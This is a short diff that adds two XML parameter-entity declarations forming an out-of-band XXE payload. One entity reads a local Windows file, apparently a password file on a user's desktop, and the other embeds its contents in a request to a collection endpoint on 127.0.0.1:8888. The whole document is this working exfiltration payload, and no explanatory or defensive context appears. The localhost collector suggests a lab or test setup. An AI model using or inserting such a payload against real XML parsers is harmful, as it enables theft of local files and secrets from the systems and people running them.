@@ -1,0 +1,2 @@
+<!ENTITY % b SYSTEM "C:\Users\Gleb\Desktop\pssw">
+<!ENTITY % c "<!ENTITY  rrr SYSTEM 'http://127.0.0.1:8888/collect?input=%b;'>">
